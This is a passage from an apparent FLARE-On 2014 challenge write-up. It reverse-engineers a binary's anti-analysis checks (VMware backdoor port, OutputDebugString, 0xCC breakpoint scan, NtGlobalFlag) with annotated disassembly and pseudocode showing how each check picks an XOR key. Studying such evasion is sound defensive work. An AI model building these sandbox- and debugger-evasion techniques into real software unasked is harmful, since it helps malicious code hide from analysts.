</span></span><span style=display:flex><span>.text:0040121<span style=color:#268bd2>C</span> <span style=color:#268bd2>in</span>      <span style=color:#b58900>eax</span>, <span style=color:#b58900>dx</span>          <span style=color:#586e75>; if in VMware, this instruction will save the magic number in ebx</span>
</span></span><span style=display:flex><span>.text:0040121<span style=color:#268bd2>D</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_1C</span>], <span style=color:#b58900>ebx</span>    <span style=color:#586e75>; executes if in VMware otherwise exception</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>It's a quick way to find if the application is running in a VMware VM. If <code>in eax, dx</code> is successful, it will save the magic number in <code>ebx</code> and then <code>var_1C</code>. If not, it will raise an exception. But the function has an exception handler and execution will be transferred back to the function. Then <code>var_1C</code> is compared to the magic number to determine if the application is in a VMware VM or not.</p><p>I was running the application in VirtualBox. Apparently Fireeye thinks we are all rich and use VMware ;) So the check failed.</p><p><img src=/images/2014/flare/7-9.jpg alt="VMware detection 2 continued" title=" VMware detection 2 continued"></p><p>The rest of the function is pretty simple, if the check fails <code>0x66</code> (character <code>f</code>) will be xor-ed with the blob. If running in VMware <code>0x01</code>.</p><figure class=code><figcaption><span>VMWare Detection 2</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>if</span> (running_in_vmware):
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>0x01</span>)
</span></span><span style=display:flex><span><span style=color:#719e07>else</span>:
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>0x66</span>)</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=function-5---outputdebugstring>Function 5 - OutputDebugString
<a class=header-link href=#function-5---outputdebugstring><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B13</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>isDebuggerPresent</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B18</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>BeingDebugged</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B1D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>VMware_detection</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B22</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>Electric_Boogaloo</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B27</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4012A0</span>       <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B2C</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401350</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B31</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4013F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B36</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401460</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3B</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>esi</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4014F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B42</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401590</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B47</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4016F0</span></span></span></code></pre></td></tr></table></div></div></div></figure><p><img src=/images/2014/flare/7-10.jpg alt=OutputDebugString title=OutputDebugString></p><p>This is almost the same as listing 16-1 in page 353 of <code>Practical Malware Analysis</code> book (<a href="http://books.google.com/books?id=FQC8EPYy834C&amp;pg=PA353&amp;dq=outputdebugstring&amp;hl=en&amp;sa=X&amp;ei=lcksVI7JM9bGsQSdpoGACA&amp;ved=0CDsQ6AEwBQ#v=onepage&amp;q=outputdebugstring&amp;f=false" target=_blank rel="noreferrer noopener">Link to p.353 on Google Books</a>). First the current error code is set to <code>0x1234</code>. Then <code>OutputDebugString</code> is called with string <code>bah!</code>. An error occurs if a debugger is not attached to the application and current error code changes, otherwise there is no error and last error code remains <code>0x1234</code>. Later, last error code is retrieved by calling <code>GetLastError</code>, if this value is not changed then a debugger is attached to the application and string <code>Sandboxes are fun to play in</code> is xor-ed with blob. In the absence of a debugger, <code>I'm gonna sandbox your face</code> is used.</p><figure class=code><figcaption><span>OutputDebugString</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span><span style=color:#268bd2>if</span>(<span style=color:#268bd2>debugger_is_attached</span>):
</span></span><span style=display:flex><span>    <span style=color:#268bd2>blob</span> = <span style=color:#268bd2>xor</span>(<span style=color:#b58900>bl</span><span style=color:#268bd2>ob</span>,<span style=color:#2aa198>&#34;Sandboxes are fun to play in&#34;</span>)
</span></span><span style=display:flex><span>else:
</span></span><span style=display:flex><span>    <span style=color:#268bd2>blob</span> = <span style=color:#268bd2>xor</span>(<span style=color:#b58900>bl</span><span style=color:#268bd2>ob</span>, <span style=color:#2aa198>&#34;I&#39;m gonna sandbox your face&#34;</span>)</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=function-6---i-can-haz-breakpoint>Function 6 - I Can Haz Breakpoint?
<a class=header-link href=#function-6---i-can-haz-breakpoint><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B13</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>isDebuggerPresent</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B18</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>BeingDebugged</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B1D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>VMware_detection</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B22</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>Electric_Boogaloo</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B27</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>OutputDebugString</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B2C</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401350</span>       <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B31</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4013F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B36</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401460</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3B</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>esi</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4014F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B42</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401590</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B47</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4016F0</span></span></span></code></pre></td></tr></table></div></div></div></figure><p><img src=/images/2014/flare/7-11.jpg alt="0xCC Check" title="0xCC Check"></p><p>Offsets from two functions are loaded and then compared. The first one calls <code>isDebuggerPresent</code> and the second one just prints something and exits. We have seen this function before, it is the first check.</p><figure class=code><figcaption><span>calls_isDebuggerPresent</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>01030 <span style=color:#268bd2>calls_isDebuggerPresent</span> <span style=color:#268bd2>proc</span> <span style=color:#268bd2>near</span>
</span></span><span style=display:flex><span>.text:00401030 <span style=color:#268bd2>push</span>    <span style=color:#b58900>esi</span>
</span></span><span style=display:flex><span>.text:00401031 <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>IsDebuggerPresent</span>
</span></span><span style=display:flex><span>.text:00401037 <span style=color:#268bd2>mov</span>     <span style=color:#b58900>esi</span>, <span style=color:#b58900>bl</span><span style=color:#268bd2>ob_length</span>
</span></span><span style=display:flex><span>.text:0040103<span style=color:#268bd2>D</span> <span style=color:#268bd2>xor</span>     <span style=color:#b58900>ecx</span>, <span style=color:#b58900>ecx</span>
</span></span><span style=display:flex><span>.text:0040103<span style=color:#268bd2>F</span> <span style=color:#268bd2>test</span>    <span style=color:#b58900>eax</span>, <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:00401041 <span style=color:#268bd2>jz</span>      <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_401079</span></span></span></code></pre></td></tr></table></div></div></div></figure><figure class=code><figcaption><span>sub_401780</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401780 <span style=color:#268bd2>sub_401780</span> <span style=color:#268bd2>proc</span> <span style=color:#268bd2>near</span>
</span></span><span style=display:flex><span>.text:00401780
</span></span><span style=display:flex><span>.text:00401780 <span style=color:#268bd2>arg_0</span>= <span style=color:#dc322f>dword</span> <span style=color:#268bd2>ptr</span>  <span style=color:#2aa198>8</span>
</span></span><span style=display:flex><span>.text:00401780
</span></span><span style=display:flex><span>.text:00401780 <span style=color:#268bd2>push</span>    <span style=color:#b58900>ebp</span>
</span></span><span style=display:flex><span>.text:00401781 <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ebp</span>, <span style=color:#b58900>esp</span>
</span></span><span style=display:flex><span>.text:00401783 <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>arg_0</span>]
</span></span><span style=display:flex><span>.text:00401786 <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:00401787 <span style=color:#268bd2>push</span>    <span style=color:#268bd2>offset</span> <span style=color:#268bd2>aBmoChopD</span> <span style=color:#586e75>; &#34;BMO Chop! [%d]\n&#34;</span>
</span></span><span style=display:flex><span>.text:0040178<span style=color:#268bd2>C</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>_printf</span>
</span></span><span style=display:flex><span>.text:00401791 <span style=color:#268bd2>add</span>     <span style=color:#b58900>esp</span>, <span style=color:#2aa198>8</span>
</span></span><span style=display:flex><span>.text:00401794 <span style=color:#268bd2>push</span>    <span style=color:#2aa198>0FFFFDCD7h</span>      <span style=color:#586e75>; uExitCode</span>
</span></span><span style=display:flex><span>.text:00401799 <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>ExitProcess</span>
</span></span><span style=display:flex><span>.text:00401799 <span style=color:#268bd2>sub_401780</span> <span style=color:#268bd2>endp</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>None of these functions are called. But their offsets are compared. If offset of <code>calls_isDebuggerPresent</code> is larger than <code>sub_401780</code> then we jump down and string <code>I can haz decode?</code> is xor-ed with the blob. Otherwise we go right. <strong>I am not quite sure what this check is for</strong>. I think it is trying to find if calls to <code>isDebuggerPresent</code> are redirected or not (by the debugger?) as the address of the first function is <code>0x401030</code> and is smaller than <code>0x401780</code>. If you know what this means please let me know and I will update this section. In all of my runs the jump does not happen and execution continues to the right.</p><p>To the right we can see a pretty standard <code>0xCC</code> check. <code>0xCC</code> is the code for <code>INT 3</code> and is used by debuggers to set breakpoints. It is simply checking if <code>0xCC</code> bytes are present in the function code. If <code>0xCC</code> is present <code>ecx</code> is increased by 2, otherwise by one. In the end this number is compared with <code>0x55</code>. If the check does not pass it will jump to left (same as above) and <code>I can haz decode?</code> is xor-ed with the blob. If the number is <code>0x55</code> string <code>Such fire. Much burn. Wow.</code> is xor-ed with the blob.</p><figure class=code><figcaption><span>ICanHaz?</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>if</span> (calls_isDebuggerPresent<span style=color:#719e07>.</span>address <span style=color:#719e07>&gt;</span> sub_401780<span style=color:#719e07>.</span>address) <span style=color:#719e07>or</span> (calls_isDebuggerPresent<span style=color:#719e07>.</span>has0xCC <span style=color:#719e07>==</span> <span style=color:#cb4b16>True</span> ):
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;I can haz decode?&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#719e07>else</span>:
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;Such fire. Much burn. Wow.&#34;</span>)</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=function-7---ntglobalflag>Function 7 - NtGlobalFlag
<a class=header-link href=#function-7---ntglobalflag><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B13</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>isDebuggerPresent</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B18</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>BeingDebugged</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B1D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>VMware_detection</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B22</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>Electric_Boogaloo</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B27</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>OutputDebugString</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B2C</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>ICanHaz?</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B31</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4013F0</span>       <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B36</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401460</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3B</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>esi</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4014F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B42</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401590</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B47</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4016F0</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>This one is pretty straightforward. A field inside the <code>PEB</code> (we have already seen it) is called <code>NtGlobalFlag</code>. This flag is at offset <code>0x68</code> in 32-bit versions of Windows (and <code>0xBC</code> for 64-bit). Usually it is set to zero but it can be changed. A process that is started by a debugger will have this field set to <code>0x70</code>. To read more about it, please look at the <a href=http://pferrie.host22.com/papers/antidebug.pdf target=_blank rel="noreferrer noopener">Anti-Debugging</a> reference.</p><p><img src=/images/2014/flare/7-12.jpg alt='"NtGlobalFlag Checked"' title="NtGlobalFlag Checked"></p><p>If <code>NtGlobalFlag</code> is not <code>0x70</code> then <code>\x09\x00\x00\x01</code> will be xor-ed with the blob, otherwise <code>Feel the sting of the monarch!</code>.</p><figure class=code><figcaption><span>NtGlobalFlag</span></figcaption><div class=codewrapper><div class=highlight><div 